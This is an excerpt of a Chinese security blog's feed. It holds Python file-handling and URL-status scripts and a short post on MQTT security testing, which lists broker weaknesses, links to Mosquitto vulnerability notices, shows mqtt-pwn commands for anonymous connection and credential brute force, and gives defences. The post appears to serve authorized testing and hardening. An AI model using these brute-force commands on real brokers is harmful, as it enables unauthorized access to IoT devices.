class="built_in">open</span>(<span class="string">&#x27;url.csv&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(<span class="built_in">str</span>(data)+<span class="string">&#x27;\n&#x27;</span>.strip())</span><br><span class="line">                    f.write(<span class="string">&quot;,&quot;</span>+line+<span class="string">&quot;\n&quot;</span>.strip())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><h2 id="判断200请求的域名"><a href="#判断200请求的域名" class="headerlink" title="判断200请求的域名"></a>判断200请求的域名</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getHttpStatusCode</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        request = requests.get(url,timeout=<span class="number">0.5</span>)</span><br><span class="line">        httpStatusCode = request.status_code</span><br><span class="line">        <span class="keyword">return</span> httpStatusCode</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            url=<span class="string">&quot;http://&quot;</span>+line</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                status = getHttpStatusCode(url.strip(<span class="string">&#x27;\n&#x27;</span>))  <span class="comment"># 换行符</span></span><br><span class="line">                <span class="built_in">print</span>(status)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;200url.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        f.write(url+<span class="string">&#x27;\n&#x27;</span>.strip())</span><br><span class="line">                        <span class="built_in">print</span>(url)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;no 200 code&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><h2 id="python-excel读取代码"><a href="#python-excel读取代码" class="headerlink" title="python-excel读取代码"></a>python-excel读取代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">读取excel表格内容信息</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">excelshili1</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取Excel文件分为几个步骤，首先是加载指定路径下的工作表文件，然后指定要读取的sheet，</span></span><br><span class="line"><span class="string">    随后指定行列来确定一个单元格，并返回其内容</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 加载文件</span></span><br><span class="line">    wb=openpyxl.load_workbook(<span class="string">&quot;./stulab.xlsx&quot;</span>)</span><br><span class="line">    <span class="comment"># 返回sheets信息</span></span><br><span class="line">    sheets=wb.sheetnames</span><br><span class="line">    <span class="comment"># 返回当前活跃的sheet名称</span></span><br><span class="line">    <span class="built_in">print</span>(wb.active.title)</span><br><span class="line">    <span class="comment"># 指定你要读取的sheet名称</span></span><br><span class="line">    sh1=wb[<span class="string">&#x27;学生信息表&#x27;</span>]</span><br><span class="line">    <span class="comment"># 制定你要读取的单元格内容</span></span><br><span class="line">    data=sh1[<span class="string">&#x27;A1&#x27;</span>].value</span><br><span class="line">    <span class="comment">#读取信息的简写方式</span></span><br><span class="line">    <span class="built_in">print</span>(wb[<span class="string">&#x27;学生信息表&#x27;</span>][<span class="string">&#x27;A1&#x27;</span>].value)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----&quot;</span>)</span><br><span class="line">    <span class="comment"># 也可以制定具体的行列编号来读取内容</span></span><br><span class="line">    <span class="built_in">print</span>(sh1.cell(<span class="number">1</span>,<span class="number">2</span>).value)</span><br><span class="line">    <span class="built_in">print</span>(sh1.cell(<span class="number">1</span>,<span class="number">3</span>).value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 也可以通过关键词参数进行数据的读取</span></span><br><span class="line">    c=sh1.cell(row=<span class="number">1</span>,column=<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;++++&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sh1.cell(row=<span class="number">2</span>,column=<span class="number">2</span>).value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">excelshili2</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用for循环读取多个记录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果需要获取sheet中的所有内容，那么可以通过for循环来搞定。</span></span><br><span class="line"><span class="string">我们可以获取指定sheet中的行数和列表，并通过for来获取数据。</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 加载文件</span></span><br><span class="line">    wb = openpyxl.load_workbook(<span class="string">&quot;./stulab.xlsx&quot;</span>)</span><br><span class="line">    <span class="comment"># 制定sheet表</span></span><br><span class="line">    sh1=wb[<span class="string">&quot;学生信息表&quot;</span>]</span><br><span class="line">    <span class="comment"># 获取行的最大值</span></span><br><span class="line">    rows=sh1.max_row</span><br><span class="line">    <span class="comment"># 获取列的最大值</span></span><br><span class="line">    columns=sh1.max_column</span><br><span class="line">    <span class="comment"># 使用for循环输出数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rows+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;/n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,columns+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(sh1.cell(i,j).value,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># excelshili1()</span></span><br><span class="line">    excelshili2()</span><br></pre></td></tr></table></figure><h2 id="读取前X行"><a href="#读取前X行" class="headerlink" title="读取前X行"></a>读取前X行</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取1.txt中的前两行</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;1.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(f.readline().strip())</span><br></pre></td></tr></table></figure><p>知识点：read(), readline()和readlines()使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">read():</span><br><span class="line">1、读取整个文件，返回的是一个字符串，字符串包括文件中的所有内容。</span><br><span class="line">2、若想要将每一行数据分离，即需要对每一行数据进行操作，此方法无效。</span><br><span class="line">3、若内存不足无法使用此方法。</span><br><span class="line"></span><br><span class="line">readline():</span><br><span class="line">1、每次读取下一行文件。</span><br><span class="line">2、可将每一行数据分离。</span><br><span class="line">3、主要使用场景是当内存不足时，使用readline()可以每次读取一行数据，只需要很少的内存。</span><br><span class="line"></span><br><span class="line">readlines():</span><br><span class="line">1、一次性读取所有行文件。</span><br><span class="line">2、可将每一行数据分离，从代码中可以看出，若需要对每一行数据进行处理，可以对readlines()求得的结果进行遍历。</span><br><span class="line">3、若内存不足无法使用此方法。</span><br></pre></td></tr></table></figure><h2 id="删除重复的行数据"><a href="#删除重复的行数据" class="headerlink" title="删除重复的行数据"></a>删除重复的行数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lines_seen = <span class="built_in">set</span>()  <span class="comment"># set方法用来删除文件中重复的行</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f1.readlines():</span><br><span class="line">            url = line.strip()</span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> lines_seen:</span><br><span class="line">                <span class="comment"># print url</span></span><br><span class="line">                f2.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                lines_seen.add(url)</span><br></pre></td></tr></table></figure><p>此脚本删除<code>test.txt</code>中重复的数据，然后将不重复的数据保存到<code>result.txt</code>中去</p><h2 id="筛选两个文件中不同的数据"><a href="#筛选两个文件中不同的数据" class="headerlink" title="筛选两个文件中不同的数据"></a>筛选两个文件中不同的数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test2.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">file1=f1.readlines()          <span class="comment"># 需要注意的地方</span></span><br><span class="line">file2=f2.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file1:</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> file2:</span><br><span class="line"><span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>此脚本对比<code>test1.txt</code>与<code>test2.txt</code>中的每一行数据，并筛选出不同的数据</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%AF%86%E7%A0%81%E4%B8%AD%E5%8C%85%E5%90%AB%E5%A4%A7%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%9</summary>
      
    
    
    
    
    <category term="python" scheme="https://yinwc.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>MQTT安全初探</title>
    <link href="https://yinwc.github.io/2020/06/16/MQTT%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2/"/>
    <id>https://yinwc.github.io/2020/06/16/MQTT%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2/</id>
    <published>2020-06-16T08:08:26.000Z</published>
    <updated>2023-02-02T06:06:57.407Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%89%8D%E8%A8%80">前言</a></li><li><a href="#mqtt%E7%AE%80%E4%BB%8B">MQTT简介</a></li><li><a href="#mqtt%E7%9A%84%E7%89%B9%E7%82%B9">MQTT的特点</a></li><li><a href="#mqtt%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95">MQTT安全测试</a><ul><li><a href="#mqtt%E7%9A%84%E6%94%BB%E5%87%BB%E7%82%B9">MQTT的攻击点</a></li><li><a href="#mqtt%E7%9A%84%E5%88%A9%E7%94%A8">MQTT的利用</a></li><li><a href="#mqtt%E9%98%B2%E5%BE%A1">MQTT防御</a></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在做安全测试，在测试的过程中遇到MQTT的测试项目，以前没了解过emmm学一波～</p><p>项目背景：<br>某项目的设备端有MQTT消息转发服务<br>端口：1883 &#x2F; 8883 端口 （QMTT over TCP）<br>版本：eclipse mosquitto 1.6.8， MQTT v3.1.1版本协议</p><h2 id="MQTT简介"><a href="#MQTT简介" class="headerlink" title="MQTT简介"></a>MQTT简介</h2><p>MQTT消息队列遥测传输（英语：Message Queuing Telemetry Transport）是ISO 标准（ISO&#x2F;IEC PRF 20922）下基于发布 (Publish)&#x2F;订阅 (Subscribe)范式的消息协议，可视为“数据传递的桥梁”它工作在 TCP&#x2F;IP协议族上，是为硬件性能低下的远程设备以及网络状况糟糕的情况下而设计的发布&#x2F;订阅型消息协议，为此，它需要一个消息中间件，以解决当前繁重的数据传输协议，如：HTTP。</p><p>MQTT 相较于HTTP， 能节省更多的资源，带来较多的传输负担，也因为这样，在制造业中，让更多人发现 IoT 在设备、厂房的无限可能，发现原来要取机台的温度这么容易，要了解厂区的产量这么方便…</p><h2 id="MQTT的特点"><a href="#MQTT的特点" class="headerlink" title="MQTT的特点"></a>MQTT的特点</h2><ol><li>使用发布&#x2F;订阅的消息模式，支持一对多的消息发布；</li><li>消息是通过TCP&#x2F;IP协议传输；</li><li>简单的数据包格式；</li><li>默认端口为TCP的1883，websocket端口8083，默认消息不加密。8883端口默认是通过TLS加密的MQTT协议。</li></ol><h2 id="MQTT安全测试"><a href="#MQTT安全测试" class="headerlink" title="MQTT安全测试"></a>MQTT安全测试</h2><h3 id="MQTT的攻击点"><a href="#MQTT的攻击点" class="headerlink" title="MQTT的攻击点"></a>MQTT的攻击点</h3><ul><li><p>授权：匿名连接问题，匿名访问则代表任何人都可以发布或订阅消息。如果存在敏感数据或指令，将导致信息泄漏或者被恶意攻击者发起恶意指令；</p></li><li><p>传输：默认未加密，则可被中间人攻击。可获取其验证的用户名和密码；</p></li><li><p>认证：弱口令问题，由于可被爆破，设置了弱口令，同样也会存在安全风险；</p></li><li><p>应用：订阅端明文配置导致泄漏其验证的用户名和密码；</p></li><li><p>漏洞：服务端软件自身存在缺陷可被利用，或者订阅端或服务端解析内容不当产生安全漏洞，这将导致整个系统。历史漏洞汇总如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、Eclipse Mosquitto 1.0～1.5.5 存在授权问题漏洞</span><br><span class="line">漏洞公告：https://www.anquanke.com/vul/id/1514742</span><br><span class="line"></span><br><span class="line">1、Eclipse Mosquitto &lt;= 1.4.15 存在拒绝服务漏洞</span><br><span class="line">漏洞公告：http://www.nsfocus.net/vulndb/40015</span><br><span class="line"></span><br><span class="line">2、 Eclipse Mosquitto 1.0～1.5.5存在访问控制漏洞</span><br><span class="line">漏洞公告：https://www.anquanke.com/vul/id/1514740</span><br><span class="line"></span><br><span class="line">3、 MQTT 3.4.6之前版本和4.0.5之前的4.0.x版本存在拒绝服务漏洞</span><br><span class="line">漏洞公告：https://www.anquanke.com/vul/id/1132531</span><br><span class="line"></span><br><span class="line">4、 MQTT protocol 3.1.1版本中存在安全漏洞</span><br><span class="line">漏洞公告：https://www.anquanke.com/vul/id/2051251</span><br></pre></td></tr></table></figure></li></ul><h3 id="MQTT的利用"><a href="#MQTT的利用" class="headerlink" title="MQTT的利用"></a>MQTT的利用</h3><p>目前已经有针对MQTT的开源利用工具，这里主要以mqtt-pwn这块工具为主。mqtt-pwn这块工具功能强大易用。</p><p>github地址为<code>https://github.com/akamai-threat-research/mqtt-pwn</code></p><p>使用文档地址为<code>https://mqtt-pwn.readthedocs.io/en/latest/</code></p><p><strong>MQTT匿名访问</strong></p><p>有一些MQTT的服务端软件默认是开启匿名访问，只要对公网开放，任何人都可以直接访问。</p><p>对于开启匿名的服务,使用MQTT-pwn测试:<br><code>connect -o host</code><br>如果没有显示连接异常，就表示连接成功。连接成功后，可使用system_info 查看系统信息</p><p><strong>MQTT用户名密码爆破</strong><br>metasploit带有MQTT的爆破模块，但效果不理想</p><p>mqtt-pwn具有bruteforce功能，并带了一个简单的字典，可以爆破MQTT的用户名和密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bruteforce --host host --port -uf user_dic -pf pass_dic</span><br></pre></td></tr></table></figure><p>端口默认是1883，用户和密码字典默认会在mqtt-pwn的resources&#x2F;wordlists 文件夹下。</p><p>例如执行bruteforce –host 127.0.0.1爆破。爆破成功后就可以使用上面将到的内容进行连接进行操作，在连接时加上用户名和密码选项即可。</p><h3 id="MQTT防御"><a href="#MQTT防御" class="headerlink" title="MQTT防御"></a>MQTT防御</h3><ol><li>请勿启用匿名访问，对服务端（BROKER）设置认证，增加用户名密码验证。</li><li>根据实际情况，优先使用加密传输数据，防止中间人攻击。</li><li>加密payload后在进行安全传输。</li><li>使用最新的服务端程序架设服务。</li><li>不要将实现的代码上传到github等代码公开平台。</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://bacde.me/post/mqtt-security-part-one/">物联网安全之MQTT协议安全</a><br><a href="https://qastack.cn/iot/452/what-simple-security-tests-can-i-perform-on-my-mqtt-network">在MQTT网络上进行安全测试</a><br><a href="http://rui0.cn/archives/975">浅析MQTT安全</a><br><a href="https://cloud.tencent.com/document/product/634/14630">MQTT.fx 接入指南</a><br><a href="https://zh.wikipedia.org/wiki/MQTT">维基百科</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;前言&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mqtt%E7%AE%80%E4%BB%8B&quot;&gt;MQTT简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mqtt%E7</summary>
      
    
    
    
    
    <category term="learn" scheme="https://yinwc.github.io/tags/learn/"/>
    
  </entry>
  
</feed>
